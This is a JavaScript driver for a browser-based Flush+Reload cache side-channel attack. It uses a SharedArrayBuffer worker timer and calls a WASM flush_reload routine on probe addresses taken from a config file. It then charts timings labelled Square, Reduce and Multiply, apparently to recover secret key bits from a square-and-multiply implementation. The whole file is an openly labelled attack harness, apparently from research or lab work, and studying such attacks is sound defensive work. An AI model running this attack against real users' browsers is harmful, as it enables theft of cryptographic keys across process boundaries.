const sab = new Uint32Array(new SharedArrayBuffer(8))
async function getTargetArrayBuffer() {
  const response = await fetch("/target_file")
  return new Uint8Array(await response.arrayBuffer())
}

async function getConfig() {
  const response = await fetch("/config")
  const configString = await response.text()
  const config = {
    threshold: 0,
    wait_cycles: 0,
    time_slots: 0 ,
    time_slot_size: 0, 
    target_file: "",
    probe: []
  }
  const lines = configString.split('\n');
  for(let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if(line.length == 0) continue
    const [key, value] = line.split(' ')
    if(key == "probe") {
      config.probe.push(Number(value))
    } else if(key == "target_file") {
      config.target_file = value
    } else {
      config[key] = Number(value)
    }
  }
  return config
}

function initializeTimer(cb) {

  if(window.Worker) {
    sab[0] = 0
    console.log("initializing timer")
    const worker = new Worker("counter.js");

    worker.onmessage = (event) => {
      console.log(event.data)
      cb()
    }
    worker.postMessage(sab)
  } else {
    console.log("web worker not available")
  }
}

function attack() {
  // CLOCK
  initializeTimer(_attack)
}

const rust = import("./pkg/flush_reload.js"); 

function _attack() {
  rust
    .then(async (m) => {
      m.default().then(async wasm => {
        let target = await getTargetArrayBuffer();
        let config = await getConfig();
        console.log(wasm)
        let probes = new Uint32Array(config.probe);
        let results = m.flush_reload(config.threshold, config.time_slots, config.wait_cycles, config.time_slot_size, probes, target);
        console.log(results)

        new Chart(document.getElementById("results"), {
          type: 'scatter',
          data: {
            labels: ["Square", "Reduce", "Multiply"],
            datasets: [
              {
                label: "Square",
                data: results.map((d, idx) => ({x: idx, y: d[0]})) }, {
                label: "Reduce",
                data: results.map((d, idx) => ({x: idx, y: d[1]}))
              },
              {
                label: "Multiply",
                data: results.map((d, idx) => ({x: idx, y: d[2]}))
              }
            ]
          },
          options: {
            scales: {
              y: {
                max: 100
              },
              x: {
                type: 'linear',
                position: 'bottom'
              }
            }
          }
        })
      })
    })
}

window.onload = () => {
  document.getElementById("btn-start-attack").onclick = attack;
  document.getElementById("btn-reload").onclick = () => window.location.reload();
}
